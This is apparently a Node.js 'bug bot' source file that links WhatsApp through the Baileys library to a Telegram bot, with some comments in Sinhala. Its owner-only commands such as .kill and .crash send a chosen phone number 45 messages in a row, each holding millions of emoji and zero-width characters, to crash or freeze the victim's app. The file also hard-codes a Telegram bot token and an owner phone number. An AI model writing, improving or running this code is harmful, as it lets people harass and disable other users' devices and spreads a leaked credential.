const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ TITAN CONFIG ---
const TG_TOKEN = '8246779983:AAEDuC8a7QMd2OwNvLDJvDGGwLkFk5nc9k8'; 

// 🔥 FIXED: මැසේජ් පෝලිම පාලනය කරන අලුත්ම සෙටින්ග්ස්
const tgBot = new TelegramBot(TG_TOKEN, { 
    polling: { 
        params: { 
            drop_pending_updates: true, // පරණ මැසේජ් ඔක්කොම අයින් කරනවා
            timeout: 10
        } 
    } 
});

const app = express();
const PORT = process.env.PORT || 3000;
let botConfig = { owner: "94767475809", prefix: "." };

app.get('/', (req, res) => res.send('TITAN ZERO-LOOP ACTIVE 🛡️'));
app.listen(PORT, () => console.log(`Stable Server on ${PORT}`));

// --- 🛡️ DOUBLE-LOCK SYSTEM ---
const processedMsgs = new Set();

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "22.0.04"],
        syncFullHistory: false
    });

    // --- 🤖 STABLE TELEGRAM HANDLER ---
    tgBot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;
        const mId = msg.message_id;

        // 🛑 LOCK 1: බොට්ගේ මැසේජ්ද කියලා බලනවා
        if (msg.from.is_bot) return;

        // 🛑 LOCK 2: මේ මැසේජ් එක දැනටමත් රන් වෙනවද කියලා බලනවා
        if (processedMsgs.has(mId)) return;
        processedMsgs.add(mId);

        // --- 🔑 PAIRING CODE LOGIC ---
        if (text === '/start') {
            await tgBot.sendMessage(chatId, "🔱 *NEXUS TITAN ZERO-LOOP*\n\nStatus: *100% Stable*\nMaster: *Sasiya MD*");
        } else if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                let code = await sock.requestPairingCode(text.trim());
                await tgBot.sendMessage(chatId, `⚡ *TITAN KEY:* \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) {
                console.log("Pairing Error");
            }
        }

        // තත්පර 30කට පස්සේ විතරක් ID එක අයින් කරනවා (ආයේ එන එක නවත්තන්න)
        setTimeout(() => processedMsgs.delete(mId), 30000);
    });

    // --- 📩 WHATSAPP BUG ENGINE (8.5M) ---
    sock.ev.on('messages.upsert', async (m) => {
        try {
            const mek = m.messages[0];
            if (!mek.message || mek.key.fromMe) return;
            const from = mek.key.remoteJid;
            if (!from.startsWith(botConfig.owner)) return;

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const targetJid = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : null;

            // ☣️ POWER PAYLOADS
            const p_titan = "☠️".repeat(1000000) + "​".repeat(7500000);

            if (command === 'menu') {
                const mText = `┏━━━━━━━━━━━━━━━━━┓\n┃  🔱 NEXUS TITAN 8.5M 🔱\n┗━━━━━━━━━━━━━━━━━┛\n\n☠️ .kill [num]\n🔥 .crash [num]\n💀 .destroy [num]\n📍 .loc_kill [num]\n📇 .vcard_dead [num]`;
                await sock.sendMessage(from, { text: mText });
            } else if (['kill', 'crash', 'destroy', 'loc_kill', 'vcard_dead'].includes(command)) {
                if (!targetJid) return;
                await sock.sendMessage(from, { text: `🔱 *TITAN ATTACKING:* ${args[0]}` });
                
                for(let i=0; i<45; i++) {
                    // Attack Logic...
                    await sock.sendMessage(targetJid, { text: p_titan });
                    await delay(80);
                }
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (u) => { if (u.connection === 'close') startNexus(); });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
